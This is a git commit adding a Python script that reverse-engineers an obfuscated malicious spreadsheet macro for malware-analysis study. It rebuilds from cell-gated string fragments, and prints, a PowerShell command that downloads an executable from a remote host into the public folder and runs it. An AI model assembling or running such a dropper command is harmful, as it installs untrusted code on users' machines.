b2c8a784ce15a238b4cca46df0e268c4d2291d9d
cabanuel <cabanuel@nps.edu>
2025-01-29 09:40:17 -0800

    added the csv and python scripts for the malicious macro reverse engineering

---
+++ macro_reverse_engineering/deals.py
@@ -0,0 +1,153 @@
+import string
+import pandas as pd
+import numpy as np
+
+col_names = list(string.ascii_uppercase) + ['AA']
+
+df = pd.read_csv('sheet2.csv', names=col_names)
+df.index = np.arange(1, len(df) + 1)
+
+t53df028c67b2f07f1069866e345c8b85 = ''
+qe32cd94f940ea527cf84654613d4fb5d = ''
+e5b138e644d624905ca8d47c3b8a2cf41 = ''
+tfd753b886f3bd1f6da1a84488dee93f9 = ''
+z92ea38976d53e8b557cd5bbc2cd3e0f8 = ''
+xc6fd40b407cb3aac0d068f54af14362e = ''
+
+print("Data Frame:\n--------")
+print(df)
+
+if df.at[62,"M"] == "Iuzaz/iA":
+	xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "$jri);"
+if df.at[80,"G"] == "bAcDPl8D":
+	xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "Invok"
+e5b138e644d624905ca8d47c3b8a2cf41 = " = '"
+if df.at[31,"P"] == "aI3bH4Rd":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "http"
+if df.at[50,"B"] == "4L3bnaGQ":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "://f"
+if df.at[32,"B"] == "QyycTMPU":
+	xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "e-Ite"
+if df.at[47,"K"] == "0kIbOvsu":
+	xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "m $jri"
+if df.at[45,"B"] == "/hRdSmbG":
+	xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + ";brea"
+if df.at[27,"D"] == "y9hFUyA8":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "ruit"
+if df.at[91,"A"] == "De5234dF":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".ret3"
+if df.at[35,"I"] == "DP7jRT2v":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".gan"
+if df.at[48,"W"] == "/O/w/o57":
+	xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "k;} c"
+if df.at[18,"R"] == "FOtBe4id":
+	xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "atch "
+if df.at[6,"W"] == "9Vo7IQ+/":
+	xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "{}"""
+if df.at[24,"U"] == "hmDEjcAE":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "g/ma"
+if df.at[96,"C"] == "1eDPj4Rc":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "lwar"
+if df.at[93,"B"] == "A72nfg/f":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".rds8"
+if df.at[90,"E"] == "HP5LRFms":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "e';$"
+tfd753b886f3bd1f6da1a84488dee93f9 = "akrz"
+if df.at[39,"G"] == "MZZ/er++":
+	tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "f3zsd"
+if df.at[93,"B"] == "ZX42cd+3":
+	tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "2832"
+if df.at[15,"I"] == "e9x9ME+E":
+	tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "0918"
+if df.at[46,"T"] == "7b69F2SI":
+	tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "2afd"
+if df.at[25,"N"] == "Ga/NUmJu":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "CNTA"
+if df.at[26,"N"] == "C1hrOgDr":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + " = '"
+if df.at[58,"C"] == "PoX7qGEp":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "banA"
+if df.at[53,"B"] == "see2d/f":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "Fl0dd"
+if df.at[2,"Q"] == "VKVTo5f+":
+	e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "NA-H"
+t53df028c67b2f07f1069866e345c8b85 = "p"
+if df.at[84,"L"] == "GSPMnc83":
+	t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "oWe"
+if df.at[35,"H"] == "aCxE//3x":
+	t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "ACew"
+if df.at[95,"R"] == "uIDW54Re":
+	t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "Rs"
+if df.at[24,"A"] == "PKRtszin":
+	t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "HELL"
+if df.at[33,"G"] == "ccEsz3te":
+	t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "L3c33"
+if df.at[31,"P"] == "aI3bH4Rd":
+	t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + " -c"
+if df.at[49,"Z"] == "oKnlcgpo":
+	tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "4';$"
+if df.at[57,"F"] == "JoTVytPM":
+	tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "jri="
+if df.at[37,"M"] == "y7MxjsAO":
+	tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "$env:"
+if df.at[20,"E"] == "ap0EvV5r":
+	tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "publ"
+z92ea38976d53e8b557cd5bbc2cd3e0f8 = "\'+$"
+if df.at[11,"D"] == "Q/GXajeM":
+	z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "CNTA"
+if df.at[45,"B"] == "/hRdSmbG":
+	z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "+'.ex"
+if df.at[85,"D"] == "y4/6D38p":
+	z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "e';tr"
+if df.at[2,"P"] == "E45tTsBe":
+	z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "4d2dx"
+if df.at[72,"O"] == "lD3Ob4eQ":
+	tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "ic+'"
+qe32cd94f940ea527cf84654613d4fb5d = "omm"
+if df.at[24,"P"] == "d/v8oiH9":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "and"
+if df.at[22,"V"] == "dI6oBK/K":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + " """
+if df.at[1,"G"] == "zJ1AdN0x":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "$oa"
+if df.at[93,"Y"] == "E/5234dF":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "e$3fn"
+if df.at[12,"A"] == "X42fc3/=":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "av3ei"
+if df.at[57,"F"] == "JoTVytPM":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "K ="
+if df.at[99,"L"] == "t8PygQka":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + " ne"
+if df.at[31,"X"] == "gGJBD5tp":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "w-o"
+if df.at[42,"C"] == "Dq7Pu9Tm":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "bjec"
+if df.at[22,"D"] == "X42/=rrE":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "aoX3&i"
+if df.at[34,"T"] == "9u2uF9nM":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "t Ne"
+if df.at[5,"G"] == "cp+qRR+N":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "t.We"
+if df.at[17,"O"] == "Q8z4cV/f":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "bCli"
+if df.at[50,"Y"] == "OML7UOYq":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "ent;"
+if df.at[41,"P"] == "bG9LxJvN":
+	qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "$OrA"
+if df.at[58,"L"] == "qK02fT5b":
+	z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "y{$oa"
+if df.at[47,"P"] == "hXelsG2H":
+	z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "K.Dow"
+if df.at[2,"A"] == "RcPl3722":
+	z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "Ry.is"
+if df.at[64,"G"] == "Kvap5Ma0":
+	z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "nload"
+if df.at[76,"H"] == "OjgR3YGk":
+	z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "File("
+
+f = t53df028c67b2f07f1069866e345c8b85 + qe32cd94f940ea527cf84654613d4fb5d \
++ e5b138e644d624905ca8d47c3b8a2cf41 + tfd753b886f3bd1f6da1a84488dee93f9 \
++ z92ea38976d53e8b557cd5bbc2cd3e0f8 + xc6fd40b407cb3aac0d068f54af14362e
+
+print("Malicious Command\n--------")
+print(f)
